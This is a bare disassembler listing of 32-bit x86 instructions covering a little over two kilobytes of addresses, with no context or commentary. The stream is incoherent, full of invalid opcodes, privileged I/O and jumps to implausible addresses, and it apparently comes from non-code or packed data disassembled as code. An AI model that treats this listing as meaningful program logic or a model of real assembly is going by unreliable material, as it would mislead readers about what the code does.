  414751:	leave  
  414752:	fdivr  DWORD PTR [ebp+0x52]
  414755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414756:	pop    edx
  414757:	idiv   BYTE PTR [eax]
  414759:	out    dx,eax
  41475a:	pop    es
  41475b:	aas    
  41475c:	cmp    al,0xc3
  41475e:	sub    al,0x95
  414760:	dec    esi
  414761:	mov    DWORD PTR [edx-0x32],edi
  414764:	pop    edi
  414765:	sbb    ah,dl
  414767:	mov    si,0x12f0
  41476b:	cmp    DWORD PTR [ecx-0x2e],ebx
  41476e:	push   ss
  41476f:	data16 xor cl,BYTE PTR [ecx+0x28]
  414773:	lahf   
  414774:	ja     0x4147aa
  414776:	jnp    0x414788
  414778:	xchg   DWORD PTR [ecx-0x46aa3096],edi
  41477e:	mov    cl,0x16
  414780:	dec    edi
  414781:	cs ja  0x414737
  414784:	push   es
  414785:	icebp  
  414786:	push   edi
  414787:	jno    0x41471d
  414789:	fs enter 0xd600,0x2d
  41478e:	fs sub ebp,edi
  414791:	dec    ebx
  414792:	(bad)
  414795:	mov    ebx,0x9341c0fc
  41479a:	cld    
  41479b:	jne    0x41476f
  41479d:	add    bh,BYTE PTR [ebx+ebx*2+0x256e7b67]
  4147a4:	xor    al,BYTE PTR [edx]
  4147a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147a7:	and    eax,0x9448a47c
  4147ac:	inc    esp
  4147ae:	pop    ss
  4147af:	sar    BYTE PTR [ecx],cl
  4147b1:	or     al,0x2
  4147b3:	rcl    dh,1
  4147b5:	call   0xb218d5ca
  4147ba:	dec    BYTE PTR [ebp+0xac5d5f5]
  4147c0:	jmp    0x5e08e525
  4147c5:	bound  esp,QWORD PTR ss:[edi+0x3]
  4147c9:	push   esi
  4147ca:	and    ebx,DWORD PTR [eax+0x8]
  4147cd:	scas   eax,DWORD PTR es:[edi]
  4147ce:	mov    eax,0x45b1fda8
  4147d3:	push   ebp
  4147d4:	stos   BYTE PTR es:[edi],al
  4147d5:	pusha  
  4147d6:	and    eax,0xb56e70c2
  4147db:	mov    edx,0x6721c3dd
  4147e0:	loope  0x41478c
  4147e2:	mov    al,0xe9
  4147e4:	ror    DWORD PTR [ebx],1
  4147e6:	imul   esi,DWORD PTR [ecx-0x4ff1d10],0x6a
  4147ed:	retf   
  4147ee:	stc    
  4147ef:	loop   0x4147f3
  4147f1:	test   BYTE PTR [ebx],dh
  4147f3:	(bad)  
  4147f4:	cli    
  4147f5:	push   es
  4147f6:	lods   al,BYTE PTR ds:[esi]
  4147f7:	fwait
  4147f8:	outs   dx,BYTE PTR ds:[esi]
  4147f9:	jmp    0x4147ff
  4147fb:	sar    DWORD PTR [ecx+0x5],1
  4147fe:	jno    0x41483c
  414800:	dec    esp
  414801:	outs   dx,BYTE PTR ds:[esi]
  414802:	jl     0x4147f4
  414804:	adc    DWORD PTR [edi-0x30],ebx
  414807:	call   DWORD PTR [ecx+eiz*2+0x4076b44d]
  41480e:	stos   DWORD PTR es:[edi],eax
  41480f:	adc    dh,BYTE PTR [esi-0x3e97ffcb]
  414815:	xchg   ebx,eax
  414816:	jnp    0x41481a
  414818:	cmp    al,0x6c
  41481a:	xchg   ebx,eax
  41481b:	test   al,0x90
  41481d:	repnz push ecx
  41481f:	push   ss
  414820:	or     eax,0xec32ca38
  414825:	(bad)
  414828:	pusha  
  414829:	pushw  cs
  41482b:	dec    ecx
  41482c:	jne    0x4147c9
  41482e:	rcl    DWORD PTR [esi+0x26d02dc2],cl
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	mov    ebp,0x7cb18561
  41483a:	out    dx,eax
  41483b:	sahf   
  41483c:	xchg   edi,eax
  41483d:	cmp    dh,bh
  41483f:	mul    DWORD PTR ds:0x1947f018
  414845:	fisttp WORD PTR [ebp+0x6b9625ac]
  41484b:	xor    al,0xef
  41484d:	jmp    0x39fca675
  414852:	gs stos DWORD PTR es:[edi],eax
  414854:	js     0x4148b8
  414856:	rcl    BYTE PTR [esi+0x750e9035],cl
  41485c:	adc    ebx,edi
  41485e:	in     al,0xaa
  414860:	pop    ecx
  414861:	scas   eax,DWORD PTR es:[edi]
  414862:	dec    edi
  414863:	jno    0x41480f
  414865:	sbb    esi,esp
  414867:	in     al,0x23
  414869:	mov    DWORD PTR [edi],esp
  41486b:	lahf   
  41486c:	jecxz  0x41489e
  41486e:	inc    edx
  41486f:	jg     0x41481c
  414871:	mov    edx,0x89a83ea4
  414876:	cmp    eax,0x42e49029
  41487b:	jbe    0x414819
  41487d:	test   eax,0xc441bde9
  414882:	or     eax,DWORD PTR [ecx]
  414884:	dec    esp
  414885:	dec    ebp
  414886:	or     BYTE PTR [ebx-0x3db370e7],dh
  41488c:	mov    dl,BYTE PTR [ebp-0x2c11316a]
  414892:	cmp    edx,eax
  414894:	mov    dh,dl
  414896:	outs   dx,BYTE PTR ds:[esi]
  414897:	jle    0x414845
  414899:	cli    
  41489a:	jp     0x414861
  41489c:	dec    eax
  41489d:	sub    esp,edi
  41489f:	and    al,0xb3
  4148a1:	jg     0x4148cc
  4148a3:	push   esp
  4148a4:	sub    DWORD PTR [esi-0x42],0xffffff9b
  4148a8:	and    BYTE PTR [ecx],ch
  4148aa:	retf   
  4148ab:	xchg   ebx,edx
  4148ad:	xchg   cl,ah
  4148af:	and    al,BYTE PTR [edi-0x5f]
  4148b2:	loopne 0x414898
  4148b4:	cs leave 
  4148b6:	xchg   ebp,eax
  4148b7:	icebp  
  4148b8:	xchg   esi,eax
  4148b9:	mov    ebx,0xf958acfb
  4148be:	cmp    ecx,DWORD PTR [eax-0x38f19c]
  4148c4:	adc    ebx,DWORD PTR [edi-0x1f648f9f]
  4148ca:	push   ds
  4148cb:	addr16 cmp esi,ebp
  4148ce:	stc    
  4148cf:	(bad)  
  4148d0:	pop    ebp
  4148d1:	mov    WORD PTR [edx-0x33],?
  4148d4:	push   es
  4148d5:	iret   
  4148d6:	mov    gs,ebp
  4148d8:	outs   dx,BYTE PTR ds:[esi]
  4148d9:	sbb    al,dh
  4148db:	mov    eax,0x3c895e47
  4148e0:	and    eax,0xac2d4ff7
  4148e5:	in     al,dx
  4148e6:	je     0x414964
  4148e8:	cdq    
  4148e9:	sahf   
  4148ea:	pushf  
  4148eb:	xor    BYTE PTR [ebx-0x5d],dl
  4148ee:	mov    edx,0xef30a2fb
  4148f3:	dec    esi
  4148f4:	mov    dh,0x87
  4148f6:	add    eax,0x3d4559a2
  4148fb:	adc    BYTE PTR [ecx+0x2270006b],0x1c
  414902:	or     BYTE PTR [ebp+0x7b],ah
  414905:	inc    ebp
  414906:	dec    ecx
  414907:	jb     0x41488e
  414909:	pop    esi
  41490a:	inc    edi
  41490b:	aad    0x3b
  41490d:	sbb    esp,DWORD PTR [edi-0x7cfdc19b]
  414913:	js     0x414909
  414915:	xchg   edi,eax
  414916:	imul   edx,esi,0x3a
  414919:	xor    bh,al
  41491b:	out    dx,eax
  41491c:	out    dx,eax
  41491d:	loope  0x4148b5
  41491f:	jmp    0x4148e9
  414921:	rcr    al,1
  414923:	push   edi
  414924:	mov    al,0x15
  414926:	test   BYTE PTR [edx-0x56],bh
  414929:	shl    DWORD PTR [edx+0x1b],1
  41492c:	pushf  
  41492d:	int3   
  41492e:	xor    dl,dh
  414930:	or     al,0x18
  414932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414933:	mov    WORD PTR [esi+0x3b474d9d],ss
  414939:	out    0xfc,al
  41493b:	sti    
  41493c:	cli    
  41493d:	cs sbb cl,0xa
  414941:	push   ss
  414942:	mov    ebx,0xa8bfee84
  414947:	xchg   ebp,eax
  414948:	xor    al,0xd9
  41494a:	(bad)  
  41494c:	add    esp,DWORD PTR [eax]
  41494e:	mov    al,ds:0x420a3f76
  414953:	push   0xffffffb9
  414955:	js     0x41495d
  414957:	push   ecx
  414958:	mov    esi,0xfbcf4a4b
  41495d:	push   0xfe649e30
  414962:	cld    
  414963:	sub    DWORD PTR [esi+0x55],esi
  414966:	pop    ebp
  414967:	xor    bl,BYTE PTR ds:0x9b9a42f8
  41496d:	mov    dl,0x17
  41496f:	test   al,0xa2
  414971:	cmp    ecx,edx
  414973:	mov    eax,0x9a20855f
  414978:	fs pop ebp
  41497a:	push   esp
  41497b:	fld    DWORD PTR [ebp-0xc]
  41497e:	mov    ch,0x3d
  414980:	adc    DWORD PTR [esi-0x7c],eax
  414983:	fiadd  WORD PTR [eax-0x767110a0]
  414989:	gs scas eax,DWORD PTR es:[edi]
  41498b:	push   ebp
  41498c:	pop    edx
  41498d:	setns  BYTE PTR [eax-0x35]
  414991:	jge    0x41495b
  414993:	int3   
  414994:	add    DWORD PTR fs:[edi+0x7353b828],ebp
  41499b:	xor    dl,BYTE PTR [edi]
  41499d:	add    DWORD PTR [edx+0x69a0d698],0xffffffa8
  4149a4:	xor    DWORD PTR [ebp+eiz*4+0xbdfd139],edx
  4149ab:	jl     0x414959
  4149ad:	add    al,0x52
  4149af:	cli    
  4149b0:	inc    esp
  4149b1:	jp     0x414933
  4149b3:	outs   dx,DWORD PTR ds:[esi]
  4149b4:	cmp    al,0x68
  4149b6:	jl     0x414954
  4149b8:	loop   0x41498d
  4149ba:	cmp    al,0xd7
  4149bc:	xor    BYTE PTR [esi-0x3ee704df],0xa0
  4149c3:	push   ss
  4149c4:	je     0x4149e6
  4149c6:	xchg   esi,eax
  4149c7:	jmp    0xd0f1:0xb767a496
  4149ce:	(bad)  
  4149cf:	je     0x4149c1
  4149d1:	das    
  4149d2:	push   ebx
  4149d3:	mov    ebp,0xb647403f
  4149d8:	outs   dx,BYTE PTR ds:[esi]
  4149d9:	enter  0x42c8,0xf0
  4149dd:	cmc    
  4149de:	int3   
  4149df:	call   0xa926c5b2
  4149e4:	pop    ebp
  4149e5:	or     dl,ah
  4149e7:	inc    ebp
  4149e8:	mov    dh,0x4f
  4149ea:	popf   
  4149eb:	jbe    0x4149f7
  4149ed:	xor    cl,cl
  4149ef:	xchg   edx,eax
  4149f0:	mov    bl,0x8a
  4149f2:	sbb    bh,dh
  4149f4:	pop    ebx
  4149f5:	ins    DWORD PTR es:[edi],dx
  4149f6:	lods   eax,DWORD PTR ds:[esi]
  4149f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149f8:	lock rcr DWORD PTR [ebx+0x3b],1
  4149fc:	xchg   edx,ebx
  4149fe:	inc    esp
  4149ff:	call   0x944d:0x9a3ceebe
  414a06:	mov    eax,0x4960b56d
  414a0b:	enter  0xf237,0x27
  414a0f:	jbe    0x414a23
  414a11:	and    BYTE PTR [ebp+0x7555a594],cl
  414a17:	inc    edx
  414a18:	dec    ecx
  414a19:	mov    ds:0xc0d9a622,al
  414a1e:	imul   esp,DWORD PTR ds:0x3ee8e18f,0xd3310ea2
  414a28:	pop    ebp
  414a29:	dec    esp
  414a2a:	and    bl,BYTE PTR [esi+edi*8]
  414a2d:	rol    BYTE PTR [edx-0x2c],1
  414a30:	mov    WORD PTR [ebp+0x7f],gs
  414a33:	jno    0x414a6a
  414a35:	sbb    eax,0xc22e86ee
  414a3a:	aaa    
  414a3b:	or     ch,BYTE PTR [ebp-0x9]
  414a3e:	and    BYTE PTR [edx-0x6a],ch
  414a41:	ins    BYTE PTR es:[edi],dx
  414a42:	mov    ch,0xe8
  414a44:	jl     0x4149cd
  414a46:	xor    al,0x28
  414a48:	and    DWORD PTR [ecx-0x4d73d209],esi
  414a4e:	aas    
  414a4f:	popf   
  414a50:	scas   eax,DWORD PTR es:[edi]
  414a51:	scas   eax,DWORD PTR es:[edi]
  414a52:	jmp    0x103f:0x1163d85
  414a59:	mov    al,0xd1
  414a5b:	xchg   DWORD PTR [esi],eax
  414a5d:	les    esi,FWORD PTR [edx-0x25]
  414a60:	cmp    eax,0xfdfb89f1
  414a65:	sub    al,0xd3
  414a67:	iret   
  414a68:	push   ebx
  414a69:	inc    eax
  414a6a:	mov    edx,0x5beb9a08
  414a6f:	aad    0x4e
  414a71:	pop    es
  414a72:	pop    ss
  414a73:	scas   al,BYTE PTR es:[edi]
  414a74:	popf   
  414a75:	and    ebx,DWORD PTR [ebx+0x4b3d8c5d]
  414a7b:	jle    0x414a16
  414a7d:	arpl   WORD PTR gs:[ebx-0x70993bd],cx
  414a84:	loop   0x414a34
  414a86:	gs jo  0x414a4e
  414a89:	add    dl,al
  414a8b:	loopne 0x414afe
  414a8d:	fld    DWORD PTR [edi]
  414a8f:	cs lahf 
  414a91:	or     BYTE PTR [ebx],bh
  414a93:	jns    0x414acd
  414a95:	sub    BYTE PTR [esi-0x7b873925],bl
  414a9b:	shl    BYTE PTR [eax],1
  414a9d:	sahf   
  414a9e:	jmp    0x15fe:0xa705442a
  414aa5:	iret   
  414aa6:	mov    ebp,0x4b9e43ce
  414aab:	sbb    ch,ch
  414aad:	push   edx
  414aae:	jb     0x414a8b
  414ab0:	or     ch,BYTE PTR [ebp+0x3ce7ce1b]
  414ab6:	add    edx,DWORD PTR [eax+0x67]
  414ab9:	test   BYTE PTR [ecx],dh
  414abb:	dec    esp
  414abc:	pop    eax
  414abd:	push   esi
  414abe:	or     BYTE PTR gs:[ecx-0x75696c4a],cl
  414ac5:	or     DWORD PTR [esi],ebp
  414ac7:	sar    DWORD PTR [edi+ecx*1+0x33],1
  414acb:	xchg   BYTE PTR [esi],dl
  414acd:	cwde   
  414ace:	stc    
  414acf:	mov    ah,0x7e
  414ad1:	xor    DWORD PTR [esi+0x69],0x31
  414ad5:	call   0x57efec8d
  414ada:	repnz push 0xfffffff6
  414add:	inc    edi
  414ade:	and    BYTE PTR [esp+edi*2-0x39a65df5],ch
  414ae5:	js     0x414af7
  414ae7:	and    eax,DWORD PTR [ebx+ebp*1-0x785823fd]
  414aee:	adc    DWORD PTR [edx+0x7d22d882],edi
  414af4:	mov    al,BYTE PTR [eax+eax*2-0x6e0e94ed]
  414afb:	sahf   
  414afc:	call   0x3aaf859
  414b01:	push   eax
  414b02:	(bad)  
  414b03:	(bad)  
  414b04:	fcomp  DWORD PTR [edi+0x6e]
  414b07:	jecxz  0x414adb
  414b09:	(bad)  
  414b0a:	xor    al,0x5e
  414b0c:	test   al,0x8b
  414b0e:	(bad)
  414b11:	fwait
  414b12:	inc    ebp
  414b13:	outs   dx,DWORD PTR ds:[esi]
  414b14:	and    DWORD PTR [eax],0xd6922b0f
  414b1a:	mov    al,0xfa
  414b1c:	test   al,0x1e
  414b1e:	mov    WORD PTR [ecx+0x17],?
  414b21:	outs   dx,DWORD PTR ds:[esi]
  414b22:	sar    dh,cl
  414b24:	pop    ebp
  414b25:	lea    esi,[ebx]
  414b27:	cmp    eax,0x2a83e3fc
  414b2c:	(bad)  
  414b2e:	outs   dx,DWORD PTR ds:[esi]
  414b2f:	mov    al,0xb6
  414b31:	add    BYTE PTR [edx],al
  414b33:	add    edx,0xffffff9f
  414b36:	clc    
  414b37:	push   esi
  414b38:	mov    al,ds:0xcce4b6b9
  414b3d:	add    dl,BYTE PTR [edx-0x12]
  414b40:	mov    esp,eax
  414b42:	push   eax
  414b43:	fisub  WORD PTR [edi-0xfd804de]
  414b49:	dec    ecx
  414b4a:	mov    esp,0xe3b662ec
  414b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b50:	adc    al,dl
  414b52:	cmp    DWORD PTR [ecx],esp
  414b54:	jge    0x414b3e
  414b56:	ins    DWORD PTR es:[edi],dx
  414b57:	add    BYTE PTR [ecx],ch
  414b59:	jle    0x414afb
  414b5b:	lea    ecx,[eax]
  414b5d:	sbb    ebp,0x94e3e155
  414b63:	fldenv [esi+0x6559c4d5]
  414b69:	adc    al,0xa8
  414b6b:	ins    DWORD PTR es:[edi],dx
  414b6c:	xor    esi,DWORD PTR [esi]
  414b6e:	mov    esi,0xbb884242
  414b73:	lahf   
  414b74:	dec    esi
  414b75:	jg     0x414b5e
  414b77:	cmp    eax,0xffffffa3
  414b7a:	adc    BYTE PTR [edx*2+0x34951ec9],cl
  414b81:	mov    edx,DWORD PTR [esi-0x20]
  414b84:	xor    al,0xaf
  414b86:	mov    al,0xf9
  414b88:	hlt    
  414b89:	repnz les edx,FWORD PTR [edi+0xc]
  414b8d:	sbb    ebp,ebx
  414b8f:	mov    al,0x48
  414b91:	imul   esp,ecx,0x8735625a
  414b97:	inc    esp
  414b98:	in     eax,0x9c
  414b9a:	loop   0x414b96
  414b9c:	leave  
  414b9d:	pop    edx
  414b9e:	ins    DWORD PTR es:[edi],dx
  414b9f:	sub    ebp,edx
  414ba1:	xor    al,0x7
  414ba3:	out    dx,eax
  414ba4:	js     0x414b2b
  414ba6:	add    al,ah
  414ba8:	in     al,0x78
  414baa:	ja     0x414bce
  414bac:	adc    ebp,DWORD PTR [ebp+0x4b16cdfc]
  414bb2:	jmp    0x62a7cbae
  414bb7:	or     eax,0xab0df68e
  414bbc:	and    al,0xd5
  414bbe:	aad    0xcf
  414bc0:	mov    ebx,0xa4ba026c
  414bc5:	arpl   WORD PTR [ebx+esi*2-0x1ab725aa],sp
  414bcc:	(bad)  
  414bce:	xchg   ebx,eax
  414bcf:	adc    al,BYTE PTR [esp+edi*8+0x6d3bb2f0]
  414bd6:	xchg   ecx,eax
  414bd7:	push   es
  414bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bd9:	cmp    dh,BYTE PTR ds:0xed4f9af4
  414bdf:	ja     0x414bc0
  414be1:	mov    ds:0x67c615a5,eax
  414be6:	imul   ebp
  414be8:	or     al,0xdb
  414bea:	mov    ch,0xa
  414bec:	ins    DWORD PTR es:[edi],dx
  414bed:	daa    
  414bee:	sbb    DWORD PTR [edi+0x30c6f41f],ebp
  414bf4:	mov    DWORD PTR [ebx-0x47cb1187],ebp
  414bfa:	adc    BYTE PTR ds:0x9ec12023,0xf0
  414c01:	lds    ecx,FWORD PTR [eax+0x1d5dfe62]
  414c07:	rcl    BYTE PTR [ebx-0x4b66cfeb],cl
  414c0d:	xchg   BYTE PTR [ebx-0x4d],bl
  414c10:	push   esp
  414c11:	mov    ebx,0x5e48e207
  414c16:	mov    ch,al
  414c18:	in     eax,0x99
  414c1a:	div    DWORD PTR ds:0x12f30101
  414c20:	loop   0x414c6a
  414c22:	in     eax,0x7a
  414c24:	xor    eax,0x84fef47f
  414c29:	jp     0x414c5b
  414c2b:	shl    DWORD PTR [edx],cl
  414c2d:	jbe    0x414c75
  414c2f:	sti    
  414c30:	inc    esi
  414c31:	hlt    
  414c32:	repnz scas eax,DWORD PTR es:[edi]
  414c34:	fstp   DWORD PTR [edi]
  414c36:	xchg   ecx,eax
  414c37:	inc    ecx
  414c38:	outs   dx,BYTE PTR ds:[esi]
  414c39:	(bad)  
  414c3a:	stc    
  414c3b:	dec    eax
  414c3c:	mov    al,0x47
  414c3e:	fdiv   st,st(6)
  414c40:	inc    ebp
  414c41:	shl    BYTE PTR [edx+0x1c],cl
  414c44:	in     eax,0xa2
  414c46:	fucomi st,st(2)
  414c48:	div    DWORD PTR [edx+0x7f]
  414c4b:	dec    edi
  414c4c:	pop    ss
  414c4d:	sbb    DWORD PTR [edx-0x42],ebp
  414c50:	inc    eax
  414c51:	push   edx
  414c52:	mov    ds:0xf91b9a95,eax
  414c57:	or     edx,DWORD PTR ds:0xf5054a29
  414c5d:	(bad)  
  414c5e:	loope  0x414c2e
  414c60:	or     esi,ebp
  414c62:	jae    0x414c6b
  414c64:	push   ds
  414c65:	pop    edx
  414c66:	push   ebx
  414c67:	sub    DWORD PTR [ebx],ebx
  414c69:	shl    DWORD PTR [ecx-0x182c698d],cl
  414c6f:	push   cs
  414c70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c71:	push   eax
  414c72:	xor    eax,0xdb0c9ac9
  414c77:	xchg   esi,eax
  414c78:	jmp    0x414c97
  414c7a:	mov    eax,ds:0x58f69e2
  414c7f:	and    cl,dh
  414c81:	sbb    al,0x74
  414c83:	int    0x83
  414c85:	daa    
  414c86:	fwait
  414c87:	sbb    edi,DWORD PTR [eax+0x46]
  414c8a:	add    BYTE PTR ds:[esi+0x2064f488],0x1b
  414c92:	jmp    0x63bca221
  414c97:	faddp  st(6),st
  414c99:	out    dx,al
  414c9a:	sbb    BYTE PTR [eax+0x64],bl
  414c9d:	cmc    
  414c9e:	mov    ds:0x4c90a8cd,eax
  414ca3:	and    DWORD PTR [edx+edx*1-0x30a0dd76],0x7c
  414cab:	cmp    edi,DWORD PTR [eax-0x3e]
  414cae:	pushf  
  414caf:	lods   eax,DWORD PTR ds:[esi]
  414cb0:	mov    eax,ds:0x47624dde
  414cb5:	rcl    DWORD PTR [ebx+0x64],cl
  414cb8:	cli    
  414cb9:	ficom  WORD PTR [ebp-0x74]
  414cbc:	sbb    ebx,0x45
  414cbf:	mov    eax,ds:0xa5629375
  414cc4:	ret    
  414cc5:	imul   edx,DWORD PTR [edx-0x6f],0x146d58dd
  414ccc:	lods   eax,DWORD PTR ds:[esi]
  414ccd:	scas   al,BYTE PTR es:[edi]
  414cce:	in     eax,dx
  414ccf:	aad    0x82
  414cd1:	gs inc esi
  414cd3:	ret    
  414cd4:	or     eax,0x44c43555
  414cd9:	shr    BYTE PTR [esi],0x6e
  414cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cdd:	call   0x6ad0d666
  414ce2:	mov    ds:0x30d8b049,al
  414ce7:	shr    BYTE PTR [ecx],cl
  414ce9:	xchg   ah,cl
  414ceb:	jg     0x414cad
  414ced:	cmp    ah,BYTE PTR ss:[esi+0x430757df]
  414cf4:	xchg   esi,eax
  414cf5:	add    bl,BYTE PTR [esp+ebp*2-0x23]
  414cf9:	ja     0x414cac
  414cfb:	sub    ah,0x5a
  414cfe:	push   es
  414cff:	adc    DWORD PTR [edx-0x4e5da3d2],0xb
  414d06:	cmp    BYTE PTR [edi-0x1cbc118a],dh
  414d0c:	lods   eax,DWORD PTR ds:[esi]
  414d0d:	push   ecx
  414d0e:	in     al,0xfc
  414d10:	xchg   edx,eax
  414d11:	scas   eax,DWORD PTR es:[edi]
  414d12:	mov    ch,dh
  414d14:	jle    0x414cb7
  414d16:	ja     0x414cdd
  414d18:	and    DWORD PTR [ecx+0x32bbcfc1],eax
  414d1e:	or     DWORD PTR [ecx-0x29b16527],ecx
  414d24:	pop    ecx
  414d25:	adc    esp,edx
  414d27:	sub    DWORD PTR [ecx+ebx*2+0x4],edx
  414d2b:	nop
  414d2c:	int    0x66
  414d2e:	fadd   st,st(7)
  414d30:	leave  
  414d31:	inc    ecx
  414d32:	mov    dh,0xe7
  414d34:	jo     0x414d5d
  414d36:	mov    edx,0x87869df1
  414d3b:	mov    edi,0x433c162f
  414d40:	pop    esi
  414d41:	and    dl,BYTE PTR [ecx]
  414d43:	shl    DWORD PTR [esi+eiz*2-0x60],0x3e
  414d48:	std    
  414d49:	rol    BYTE PTR [esi*4-0x574cbd07],1
  414d50:	mov    esi,0x722631e
  414d55:	cli    
  414d56:	cmp    ch,BYTE PTR [ebx+0x63]
  414d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d5a:	fidivr WORD PTR [esi-0x43643a07]
  414d60:	jmp    DWORD PTR [esi+0x3a]
  414d63:	dec    edi
  414d64:	scas   eax,DWORD PTR es:[edi]
  414d65:	addr16 loopne 0x414d4c
  414d68:	adc    eax,0x16546f5a
  414d6d:	bound  ebp,QWORD PTR [edi+0x6755cc0f]
  414d73:	xor    al,cl
  414d75:	add    DWORD PTR [ebx-0x50],ecx
  414d78:	out    0x92,al
  414d7a:	inc    eax
  414d7b:	mov    ds,WORD PTR [ecx]
  414d7d:	aam    0x29
  414d7f:	adc    eax,DWORD PTR [edi]
  414d81:	lds    esi,FWORD PTR fs:[esi-0x3e]
  414d85:	aam    0xfd
  414d87:	std    
  414d88:	enter  0x7b00,0x2d
  414d8c:	or     BYTE PTR [edx-0x496d6dda],bh
  414d92:	sub    ebp,DWORD PTR [esi+edx*4-0x2b9cc6d4]
  414d99:	mov    bl,0x56
  414d9b:	jp     0x414d5c
  414d9d:	das    
  414d9e:	fistp  QWORD PTR [eax]
  414da0:	aad    0xf0
  414da2:	test   DWORD PTR [ebp+0x4f],edi
  414da5:	jmp    0x414d55
  414da7:	pop    esi
  414da8:	jle    0x414d5c
  414daa:	mov    BYTE PTR [ebx],bl
  414dac:	mov    BYTE PTR [edx],bh
  414dae:	jl     0x414db0
  414db0:	fbld   TBYTE PTR [esi-0x2172fb77]
  414db6:	int3   
  414db7:	test   eax,0x862641af
  414dbc:	xchg   ebp,eax
  414dbd:	icebp  
  414dbe:	and    eax,0xdca9b694
  414dc3:	xchg   BYTE PTR [edi+ebp*8],bl
  414dc6:	pusha  
  414dc7:	retf   
  414dc8:	std    
  414dc9:	les    esi,FWORD PTR [eax-0x21900694]
  414dcf:	and    ah,BYTE PTR [ecx]
  414dd1:	mov    ch,0x20
  414dd3:	hlt    
  414dd4:	inc    ebx
  414dd5:	popa   
  414dd6:	retf   0x5595
  414dd9:	jmp    0xc988:0x4cf3be0b
  414de0:	fmul   QWORD PTR [edx+eax*8]
  414de3:	push   edi
  414de4:	retf   
  414de5:	add    BYTE PTR [edi-0x60],bl
  414de8:	es popf 
  414dea:	xor    al,0x9b
  414dec:	push   edx
  414ded:	aad    0x43
  414def:	popf   
  414df0:	xchg   edi,eax
  414df1:	xchg   eax,esi
  414df3:	jg     0x414d77
  414df5:	sub    eax,0xf1a2e585
  414dfa:	xchg   ebp,eax
  414dfb:	cwde   
  414dfc:	daa    
  414dfd:	rol    BYTE PTR [ebp-0x6a],cl
  414e00:	sbb    bl,bl
  414e02:	adc    ch,BYTE PTR [edx]
  414e04:	cwde   
  414e05:	adc    BYTE PTR [eax+0x7],cl
  414e08:	sub    al,0x72
  414e0a:	pop    eax
  414e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e0c:	loope  0x414dde
  414e0e:	or     eax,0x14574709
  414e13:	push   esp
  414e14:	jb     0x414e7f
  414e16:	push   ds
  414e17:	imul   esi,esp,0xffffffca
  414e1a:	jo     0x414e42
  414e1c:	lds    esi,FWORD PTR [edi+0x5c]
  414e1f:	and    cl,BYTE PTR [eax]
  414e21:	ja     0x414e09
  414e23:	sub    bl,dl
  414e25:	aam    0x74
  414e27:	out    dx,al
  414e28:	(bad)  
  414e29:	adc    dh,BYTE PTR [eax-0x5c]
  414e2c:	jmp    0x414e82
  414e2e:	adc    DWORD PTR [ecx],0x4d5135ea
  414e34:	inc    eax
  414e35:	mov    dh,0x51
  414e37:	mov    edi,0xc39d2b14
  414e3c:	imul   ebp,DWORD PTR [eax+0x47],0x74a06844
  414e43:	add    DWORD PTR [ecx-0x1b5edd63],esi
  414e49:	xor    DWORD PTR [edi-0x16],ebp
  414e4c:	or     ebx,DWORD PTR [edx-0x79]
  414e4f:	aam    0x94
  414e51:	jmp    0x414e01
  414e53:	idiv   ebx
  414e55:	in     eax,0x8c
  414e57:	sbb    dh,BYTE PTR [ebx+0x34]
  414e5a:	fisub  WORD PTR [ebx-0x5e]
  414e5d:	test   eax,0xc1bffbb8
  414e62:	jno    0x414e0e
  414e64:	(bad)  
  414e65:	jns    0x414e5c
  414e67:	es jno 0x414eb2
  414e6a:	inc    edx
  414e6b:	pop    edi
  414e6c:	je     0x414dfd
  414e6e:	repnz sub al,0xf
  414e71:	jo     0x414e32
  414e73:	mov    cl,0xa2
  414e75:	or     edi,DWORD PTR [esi-0x59d46e38]
  414e7b:	push   ecx
  414e7c:	aam    0x2e
  414e7e:	adc    al,BYTE PTR [ebx+0x4e]
  414e81:	jl     0x414ea0
  414e83:	retf   
  414e84:	fcmovne st,st(5)
  414e86:	lock add BYTE PTR [esi+0x3456503f],ah
  414e8d:	(bad)  
  414e8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e8f:	mov    BYTE PTR [ebp+0x1a],0x2a
  414e93:	fs jge 0x414f02
  414e96:	imul   ebp,DWORD PTR ds:0x672bf923,0xccc2fba1
  414ea0:	mov    edi,0x875b315b
  414ea5:	jle    0x414ef2
  414ea7:	sbb    al,0xfc
  414ea9:	fs jl  0x414ed8
  414eac:	shl    BYTE PTR [esi],0x23
  414eaf:	ds inc edi
  414eb1:	xor    ah,BYTE PTR ds:0x3a4def3
  414eb7:	rol    BYTE PTR [edi+0x61],cl
  414eba:	stos   BYTE PTR es:[edi],al
  414ebb:	fadd   QWORD PTR [ebx+0x31]
  414ebe:	(bad)  
  414ebf:	popf   
  414ec0:	cwde   
  414ec1:	lock rcr BYTE PTR ds:0x70df7165,0x32
  414ec9:	jmp    0x414e86
  414ecb:	inc    ebp
  414ecc:	adc    esi,DWORD PTR [eax+0x698ebfad]
  414ed2:	not    BYTE PTR [ebx+0x1f3976a3]
  414ed8:	dec    esi
  414ed9:	xor    BYTE PTR [edi-0x29],bl
  414edc:	loopne 0x414e63
  414ede:	outs   dx,BYTE PTR ds:[esi]
  414edf:	icebp  
  414ee0:	push   ecx
  414ee1:	mov    DWORD PTR [eax+0x4591519],0xb4e8189e
  414eeb:	das    
  414eec:	cmp    eax,0xfa23a9a6
  414ef1:	rcl    al,0x22
  414ef4:	sub    eax,0x48fb6c6f
  414ef9:	ins    BYTE PTR es:[edi],dx
  414efa:	mov    edx,0x814bb4c4
  414eff:	xlat   BYTE PTR ds:[ebx]
  414f00:	test   al,0x2d
  414f02:	fwait
  414f03:	adc    ebp,DWORD PTR [eax+0x4ced93d5]
  414f09:	push   esi
  414f0a:	scas   eax,DWORD PTR es:[edi]
  414f0b:	aad    0x1e
  414f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f0e:	inc    edi
